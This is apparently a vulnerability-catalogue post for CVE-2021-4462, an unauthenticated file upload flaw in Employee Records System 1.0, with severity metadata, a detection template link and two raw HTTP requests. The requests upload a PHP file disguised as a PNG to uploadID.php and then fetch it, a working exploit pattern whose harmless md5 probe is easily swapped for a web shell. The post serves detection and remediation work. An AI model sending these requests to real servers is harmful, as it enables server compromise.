---
layout: post
cve_id: CVE-2021-4462
title: Employee Records System 1.0 - Unauthenticated File Upload RCE
pcap: true
pcap_path: /pcaps/2021/CVE-2021-4462.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-4462.yaml
snort2_rule: N/A
snort3_rule: N/A
author: josephttd
severity: critical
impact: 'Unauthenticated attackers can upload arbitrary PHP files via uploadID.php
  and achieve remote code execution, leading to complete server compromise.

  '
remediation: 'Apply security patches or upgrade to a later version of Employee Records
  System.

  '
reference:
- https://www.exploit-db.com/exploits/49596
- https://www.sourcecodester.com/php/11393/employee-records-system.html
classification:
  cvss-score: 9.8
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cwe-id: CWE-434
  epss-score: 0.22195
  epss-percentile: 0.95609
metadata:
  verified: true
  max-request: 2
tags:
- cve
- cve2021
- employee-records
- fileupload
- rce
- intrusive
- vkev
---

## üîç Vulnerability Description
Employee Records System version 1.0 contains an unrestricted file upload vulnerability in uploadID.php that allows remote unauthenticated attackers to upload arbitrary PHP files and achieve remote code execution.


## üåê HTTP Request
```nohighlight
POST /dashboard/uploadID.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Connection: close
Content-Length: 238
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="employee_ID"; filename="epyMsKTc"
Content-Type: image/png

<?php echo md5("CVE-2021-4462");unlink(__FILE__); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```nohighlight
GET /uploads/employees_ids/rAFrUs HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/129.0
Connection: close
Accept-Encoding: gzip
```

